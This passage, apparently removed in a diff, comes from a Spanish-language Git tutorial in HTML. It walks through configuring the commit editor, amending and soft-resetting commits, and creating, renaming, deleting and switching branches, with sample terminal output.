-&lt;p&gt;Para &lt;code&gt;Windows&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;Si queremos usar &lt;code&gt;Visual Studio Code&lt;/code&gt; ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;code --wait&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos usar &lt;code&gt;Sublime Text&lt;/code&gt; ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;'C:/Program Files (x86)/sublime text 3/subl.exe' -w&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos usar &lt;code&gt;Notepad++&lt;/code&gt; ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ git config --global core.editor &quot;'C:/Program Files (x86)/Notepad++/notepad++.exe' -multiInst -notabbar -nosession -noPlugin&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entonces una vez tengamos configurado nuestro editor procedemos a ejecutar &lt;code&gt;git commit&lt;/code&gt; y se procedera a abrirnos nuestro editor de texto. Tal y como nos indicar podemos agregar un mensaje del &lt;code&gt;commit&lt;/code&gt; en una linea sin comentar y guardamos los cambios, pero si deseamos cancelar la operación simplemente el mensaje tiene que estar vacio.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# En la rama main
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entonces vamos a agregar un mensaje para el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a segundo commit
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# En la rama main
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y automaticamente al guardar y cerrar el archivo, procede a crearse el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
-[main bb00766] Cambiar texto a segundo commit
- 1 file changed, 1 insertion(+), 1 deletion(-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora podemos volver a ver el historial de &lt;code&gt;commits&lt;/code&gt; usando &lt;code&gt;git log&lt;/code&gt; y esta vez vemos los dos &lt;code&gt;commits&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
-commit bb007665d2356b9531ce10be913fd26a27e757da (HEAD -&amp;gt; main)
-Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
-Date:   Mon Apr 10 20:13:55 2023 +0000
-
-    Cambiar texto a segundo commit
-
-commit 0143452c010ede2332f5c1b8bad7815743770a2a
-Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
-Date:   Mon Apr 10 18:43:50 2023 +0000
-
-    agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;cambiar-descripción-del-commit&quot;&gt;Cambiar Descripción del Commit &lt;a href=&quot;#cambiar-descripción-del-commit&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Supongamos que creamos un &lt;code&gt;commit&lt;/code&gt;, pero vimos que pudimos tener un error de tipeo o el mensaje no es muy descriptivo. Pues podemos modificar el ultimo &lt;code&gt;commit&lt;/code&gt; usando el comando &lt;code&gt;git commit --amend&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit --amend
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al ejecutar se nos vuelve a abrir el editor de texto con la descripción que habiamos ingresado&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a segundo commit
-
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# Fecha:     Mon Apr 10 20:13:55 2023 +0000
-#
-# En la rama main
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para modificarlo solo debemos modificar el mensaje, guardar y cerrar el archivo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar el contenido de mi commit
-
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# Fecha:     Mon Apr 10 20:13:55 2023 +0000
-#
-# En la rama main
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Regresamos a donde ejecutamos el comando y vemos que se actualizo correctamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit --amend
-[main 222c488] Cambiar el contenido de mi commit
- Date: Mon Apr 10 20:13:55 2023 +0000
- 1 file changed, 1 insertion(+), 1 deletion(-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para verificar que se actualizo el &lt;code&gt;commit&lt;/code&gt; en el historial usamos &lt;code&gt;git log&lt;/code&gt;, pero esta vez agregaremos el parametro &lt;code&gt;--oneline&lt;/code&gt; para acortar la información mostrada.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
-222c488 (HEAD -&amp;gt; main) Cambiar el contenido de mi commit
-0143452 agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y vemos que fue modificado con exito.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Es importante saber que si vamos a ejecutar el comando &lt;code&gt;git commit --amend&lt;/code&gt; lo hagamos en nuestro &lt;code&gt;repositorio local&lt;/code&gt; no en uno remoto ya que puede ser riesgoso si lo hacemos en proyectos que ya estan siendo usados por otros desarrolladores.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Como consejo hay que tratar siempre de ingresar la descripción o mensaje correcto al &lt;code&gt;commit&lt;/code&gt; para evitar realizar este proceso&lt;/p&gt;
-
-&lt;h2 id=&quot;revertir-commits&quot;&gt;Revertir Commits &lt;a href=&quot;#revertir-commits&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Suele pasar en ocasiones cuando estamos trabajando en algun proyecto y al crear un &lt;code&gt;commit&lt;/code&gt; nos damos cuenta de que nos faltaba agregar algo. Si queremos revertir los cambios hechos por un &lt;code&gt;commit&lt;/code&gt;, podemos hacerlo de forma tal que no se afecten los archivos.&lt;/p&gt;
-
-&lt;p&gt;Para realizar esto el comando que debemos ejecutar es &lt;code&gt;git reset --soft HEAD~1&lt;/code&gt;, donde con el parametro &lt;code&gt;soft&lt;/code&gt; podemos reiniciarlo de modo que los archivos no se modifiquen en el directorio de trabajo. Solo se va a deshacer el registro del &lt;code&gt;commit&lt;/code&gt;, en este caso con &lt;code&gt;HEAD~1&lt;/code&gt; indicaremos al ultimo &lt;code&gt;commit&lt;/code&gt; que se realizo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git reset --soft HEAD~1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez ejecutamos el comando, visiblemente no vemos ningun cambio, pero si volvemos a ver el historial de &lt;code&gt;commits&lt;/code&gt;, solo vemos el primer &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log
-commit 0143452c010ede2332f5c1b8bad7815743770a2a (HEAD -&amp;gt; main)
-Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
-Date:   Mon Apr 10 18:43:50 2023 +0000
-
-    agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y si volvemos a leer el archivo, aún mantiene el contenido con los cambios que habiamos realizado&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi segundo commit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero que pasa si volvemos a modificar el archivo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi segundo commit pero modificado
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;º
-y volvemos a ejecutar &lt;code&gt;git status&lt;/code&gt;, vemos cambios listos para ser agregados y otros que aun no estan listos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama main
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	modificados:     archivo_git.txt
-
-Cambios no rastreados para el commit:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
-  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
-	modificados:     archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como deshicimos el ultimo &lt;code&gt;commit&lt;/code&gt; lo que quiere decir que el cambio a de ese ultimo &lt;code&gt;commit&lt;/code&gt; que borramos, aún no es parte del repositorio. Para agregar todos esos cambios lo que podemos hacer es ejecutar el comando &lt;code&gt;git add .&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Con &lt;code&gt;git add .&lt;/code&gt; podemos agregar todos los cambios al &lt;code&gt;area de preparación&lt;/code&gt;, sin necesidad de ejecutar cada archivo.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
-❯ git status
-En la rama main
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	modificados:     archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora si queremos crear este &lt;code&gt;commit&lt;/code&gt;, volvemos a ejecutar &lt;code&gt;git commit&lt;/code&gt; y asignamos un mensaje mas especifico&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Actualizar teto del segundo commit modificado
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# En la rama main
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Guardamos y cerramos y ya tendriamos creado este nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
-[main 415796f] Actualizar teto del segundo commit modificado
- 1 file changed, 1 insertion(+), 1 deletion(-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;branch-ramas&quot;&gt;Branch - Ramas &lt;a href=&quot;#branch-ramas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Un &lt;code&gt;branch&lt;/code&gt; es una linea independiente de desarrollo en el repositorio, gracias a estas podemos tener copias del &lt;code&gt;branch&lt;/code&gt; principal y que estas vallan evolucionando o cambiando independientemente sin afectar al &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;
-
-&lt;p&gt;El concepto es similar a las ramas de un arbol, donde tenemos como branch o rama principal &lt;code&gt;main&lt;/code&gt; o &lt;code&gt;master&lt;/code&gt; y desde ahi podemos crear otras subramas que en algun  momento si queremos podemos convinar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/ramas.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Supongamos que tenemos una linea actual del proyecto, pero queremos agregarle nuevas funcionalidades como una nueva sección o cambiar algo para ver su funcionamiento. Pues si creamos un nuevo &lt;code&gt;branch&lt;/code&gt; podemos realizar nuestros cambios sin afectar la versión que actualmente este activo.&lt;/p&gt;
-
-&lt;p&gt;Una vez que el &lt;code&gt;branch&lt;/code&gt; alterno a evolucionado con todos los cambios correspondientes, podemos combinarla con el &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;
-
-&lt;h3 id=&quot;creación-de-un-branch&quot;&gt;Creación de un Branch &lt;a href=&quot;#creación-de-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Para poder crear un nuevo &lt;code&gt;branch&lt;/code&gt; debemos ejecutar el comando &lt;code&gt;git branch&lt;/code&gt; y seguidamente el nombre de la rama que queremos crear&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch primer-branch-alterno
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;y ahora para visualizar los &lt;code&gt;branch&lt;/code&gt; que tenemos usamos unicamente el comando &lt;code&gt;git branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-* main
-  primer-branch-alterno
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El comandos nos muestra que ahora tenemos dos &lt;code&gt;branch&lt;/code&gt;, el principal que teniamos &lt;code&gt;main&lt;/code&gt; y ahora el nuevo que creamos &lt;code&gt;primer-branch-alterno&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;moverse-de-branch&quot;&gt;Moverse de Branch &lt;a href=&quot;#moverse-de-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Si queremos desplazarnos de un &lt;code&gt;branch&lt;/code&gt; a otro debemos ejecutar el comando &lt;code&gt;git checkout&lt;/code&gt; y seguido el nombre del &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch-alterno
-Cambiado a rama 'primer-branch-alterno'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para confirmar que nos cambiamos a ese nuevo &lt;code&gt;branch&lt;/code&gt; volvemos a ejecutar &lt;code&gt;git branch&lt;/code&gt; y esta vez nos selecciona el &lt;code&gt;branch&lt;/code&gt; alterno&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-  main
-* primer-branch-alterno
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora existe una forma de agilizar este proceso de creación y desplazamiento de un &lt;code&gt;branch&lt;/code&gt; para ello debemos ejecutar &lt;code&gt;git checkout -b&lt;/code&gt; y seguido el nombre de la rama. Pero es importante antes de ejecutar el comando volver a nuestro &lt;code&gt;branch&lt;/code&gt; original &lt;code&gt;main&lt;/code&gt; ya que nos encontramos en el &lt;code&gt;branch&lt;/code&gt; &lt;code&gt;primer-branch-alterno&lt;/code&gt; y nosotros queremos crear el &lt;code&gt;branch&lt;/code&gt; a partir de el &lt;code&gt;branch&lt;/code&gt; principal.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
-Cambiado a rama 'main'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y ahora si podemos ejecutar el comando y visializamos que efectivamente nos encontramos en el nuevo &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout -b segundo-branch-alterno
-Cambiado a nueva rama 'segundo-branch-alterno'
-❯ git branch
-  main
-  primer-branch-alterno
-* segundo-branch-alterno
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;cambiar-nombre-al-branch&quot;&gt;Cambiar Nombre al Branch &lt;a href=&quot;#cambiar-nombre-al-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Para cambiar el nombre de un &lt;code&gt;branch&lt;/code&gt; existen dos metodos:&lt;/p&gt;
-
-&lt;p&gt;En el primero debemos estar en el &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar el nombre, para este caso queremos cambiar el nombre de &lt;code&gt;primer-branch-alterno&lt;/code&gt; a &lt;code&gt;primer-branch&lt;/code&gt; y ejecutar el comando &lt;code&gt;git branch -m&lt;/code&gt; y seguidamente el nuevo nombre a asignar.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch-alterno
-Cambiado a rama 'primer-branch-alterno'
-git branch -m primer-branch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Verificamos los cambios usando &lt;code&gt;git branch&lt;/code&gt;y efectivamente nos modifico el nombre&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-  main
-* primer-branch
-  segundo-branch-alterno
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si queremos usar el segundo metodo no es necesario estar en el &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar, tan solo hay que ejecutar &lt;code&gt;git branch -m&lt;/code&gt;, seguidamente el nombre del &lt;code&gt;branch&lt;/code&gt; que deseamos cambiar &lt;code&gt;segundo-branch-alterno&lt;/code&gt; y despues el nuevo nombre que se le asignara &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -m segundo-branch-alterno segundo-branch
-❯ git branch
-  main
-* primer-branch
-  segundo-branch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&quot;eliminar-un-branch&quot;&gt;Eliminar un Branch &lt;a href=&quot;#eliminar-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Una vez que combinamos los cambios que realizamos en los &lt;code&gt;branchs&lt;/code&gt; o si las creamos por error, podemos eliminarlos.&lt;/p&gt;
-
-&lt;p&gt;Si deseamos eliminar el &lt;code&gt;branch&lt;/code&gt;, hay que ejecutar el comando &lt;code&gt;git branch -d&lt;/code&gt; y seguidamente el nombre del &lt;code&gt;branch&lt;/code&gt; que queramos borrar.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -d segundo-branch
-Eliminada la rama segundo-branch (era 415796f).
-❯ git branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Verificamos si se realizaron los cambios y se borro el &lt;code&gt;branch&lt;/code&gt; con exito.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-  main
-* primer-branch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Este comando aplica a &lt;code&gt;branch&lt;/code&gt; en repositorios locales no en &lt;code&gt;branch&lt;/code&gt; que se encuentren publicadas.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;crear-commits-en-un-branch&quot;&gt;Crear Commits en un Branch &lt;a href=&quot;#crear-commits-en-un-branch&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Veamos como podemos crear un &lt;code&gt;commit&lt;/code&gt; en un &lt;code&gt;branch&lt;/code&gt; que no sea &lt;code&gt;main&lt;/code&gt; que nosotros creemos y veremos como podemos cambiar entre estos &lt;code&gt;branch&lt;/code&gt; para ver como nuestros archivos cambian en nuestros directorios de trabajo.&lt;/p&gt;
-
-&lt;p&gt;Esta parte es excelente, paece magia negra xD!&lt;/p&gt;
-
-&lt;p&gt;Bueno sabemos que tenemos un archivo de texto en nuestro directorio llamado &lt;code&gt;archivo_git.txt&lt;/code&gt; con un cotenido asignado.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- archivo_git.txt
-❯ /bin/cat archivo_git.txt
-Este es mi segundo commit pero modificado
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora nos encontramos en nuestro &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-* main
-  primer-branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Primero para realizar un cambio nos vamos a mover a nuestro &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout primer-branch
-Cambiado a rama 'primer-branch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Una vez nos en este &lt;code&gt;branch&lt;/code&gt; leemos el archivo que tenemos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;❯ /bin/cat archivo_git.txt
-Este es mi segundo commit pero modificado
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ver que el contenido es el mismo, entonces ahora vamos a modificarlo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Hola Git
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Veamos ahora que ocurre si ejecutamos &lt;code&gt;git status&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama primer-branch
-Cambios no rastreados para el commit:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
-  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
-	modificados:     archivo_git.txt
-
-sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Nos muestra que estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt; y que tenemos cambios que aún no han sido preparados para el proximo &lt;code&gt;commit&lt;/code&gt;. Entonces para agregsarlo ejecutamos el comando &lt;code&gt;git add .&lt;/code&gt; para agregarlos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
-❯ git status
-En la rama primer-branch
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	modificados:     archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Esta vez aun estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;, pero si tenemos el archivo en el &lt;code&gt;area de preparación&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Procedemos a crear nuestro &lt;code&gt;commit&lt;/code&gt; con &lt;code&gt;git commit&lt;/code&gt; y se nos abre nuestro editor de texto, en el cual introduciremos la descripción de este nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Cambiar texto a Hola Git
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# En la rama primer-branch
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Guardamos y cerramos el editor y tendriamos un nuevo &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
-[primer-branch 9771c56] Cambiar texto a Hola Git
- 1 file changed, 1 insertion(+), 1 deletion(-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a leer el archivo otra vez, recordar que estamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Hola Git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;efectivamente vemos los cambios que realizamos, pero que pasa si ahora vamos a nuestro &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
-Cambiado a rama 'main'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez aqui voy a leer mi archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi segundo commit pero modificado
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y pumm! wala!! se tenso la cosa, tenemos el contenido antes de realizar el &lt;code&gt;commit&lt;/code&gt; en el &lt;code&gt;branch&lt;/code&gt; alterno. Esto es super genial por que estamos trabajando con el mismo archivo, pero con dos versiones diferentes :).&lt;/p&gt;
-
-&lt;h3 id=&quot;historial-de-commits-en-branchs&quot;&gt;Historial de Commits en Branchs &lt;a href=&quot;#historial-de-commits-en-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Primeramente vamos a ejecutar el comando &lt;code&gt;git log&lt;/code&gt; con el parametro &lt;code&gt;--oneline&lt;/code&gt; para acortar la información.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
-415796f (HEAD -&amp;gt; main) Actualizar teto del segundo commit modificado
-0143452 agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver el historial de &lt;code&gt;commits&lt;/code&gt; en &lt;code&gt;main&lt;/code&gt;, pero no vemos el &lt;code&gt;commit&lt;/code&gt; que realizamos en el &lt;code&gt;branch&lt;/code&gt; alterno &lt;code&gt;primer-branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a irnos a el &lt;code&gt;branch&lt;/code&gt; alterno con &lt;code&gt;git checkout&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
-9771c56 (HEAD -&amp;gt; primer-branch) Cambiar texto a Hola Git
-415796f (main) Actualizar teto del segundo commit modificado
-0143452 agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Nos damos cuenta que ambos &lt;code&gt;branch&lt;/code&gt; comparten los ultimos dos &lt;code&gt;commits&lt;/code&gt;, pero despues al crearse el &lt;code&gt;branch&lt;/code&gt; alterno el primer &lt;code&gt;commit&lt;/code&gt; que se creo fue el primero. Por eso este &lt;code&gt;branch&lt;/code&gt; muestra este nuevo &lt;code&gt;commit&lt;/code&gt; y el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt; no, ya que el primer &lt;code&gt;commit&lt;/code&gt; pertener a este nuevo &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Debo mencionar que existe un comando el cual muestra los &lt;code&gt;commit&lt;/code&gt; y cual fue la diferencia que introdujo el &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log -p
-commit 9771c563effc6eb6a82ed94947c125fdbdd03233 (HEAD -&amp;gt; primer-branch)
-Author: Firtsmiracle &amp;lt;firtsmiracle@hotmail.com&amp;gt;
-Date:   Mon Apr 10 21:46:43 2023 +0000
-
-    Cambiar texto a Hola Git
-
-diff --git a/archivo_git.txt b/archivo_git.txt
-index cf36484..0152d71 100644
---- a/archivo_git.txt
-+++ b/archivo_git.txt
-@@ -1 +1 @@
--Este es mi segundo commit pero modificado
-+Hola Git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;merge-fusionar-branchs&quot;&gt;Merge - Fusionar Branchs &lt;a href=&quot;#merge-fusionar-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Ya que los &lt;code&gt;branchs&lt;/code&gt; son temporales, debido a que existen miestras estamos desarrollando alguna funcionalidad o corrigiendo un problema, llegara un momento en que debamos fusionar esos cambios con el &lt;code&gt;branch&lt;/code&gt; principal, este proceso se denomina &lt;code&gt;merge&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Para fusionar dos &lt;code&gt;branch&lt;/code&gt; es muy importante estar en el &lt;code&gt;branch&lt;/code&gt; que recibira la fusión.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Para ello vamos a practicar lo anteriormente aprendido.&lt;/p&gt;
-
